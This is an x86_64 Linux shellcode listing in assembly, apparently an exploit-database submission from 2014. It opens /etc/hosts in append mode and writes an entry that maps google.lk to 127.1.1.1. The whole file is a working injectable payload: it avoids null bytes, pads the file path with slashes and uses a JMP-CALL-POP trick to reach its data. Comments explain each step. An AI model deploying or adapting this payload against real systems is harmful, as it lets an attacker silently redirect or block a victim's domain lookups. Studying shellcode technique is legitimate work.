; Title: Add map in /etc/hosts file - 110 bytes
; Date: 2014-10-29
; Platform: linux/x86_64
; Website: http://osandamalith.wordpress.com
; Author: Osanda Malith Jayathissa (@OsandaMalith)

global _start

section .text

_start:

    ; set RAX to 2 (syscall open)
    xor rax, rax 
    add rax, 2

    ; clear RDI and RSI
    xor rdi, rdi
    xor rsi, rsi
    
    ; 1st argument of open: pointer to the file to open
    ; in this case: /etc///////hosts
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp

    ; 2nd argument of open: flags to use when opening
    ; the file
    ; in this case: 0x401 (O_WRONLY | O_APPEND)
    xor rsi, rsi
    add si, 0x401

    ; invoke open syscall
    syscall

    ; save the file descriptor of the opened file in
    ; the register RDI
    xchg rax, rdi


    ; set RAX to 1: syscall write
    xor rax, rax

    ; invoke the syscall write
    add rax, 1

    ; use the JMP-POP-CALL syscall to get the address
    ; of the new host entry into RSI
    jmp data

write:

    pop rsi

    ; 3rd argument of write syscall, number of bytes
    ; to write 
    mov dl, 19

    ; invoke syscall write
    syscall

    ; invoke syscall close
    xor rax, rax
    add rax, 3
    syscall

    ; invoke syscall exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:

    call write
    text db '127.1.1.1 google.lk'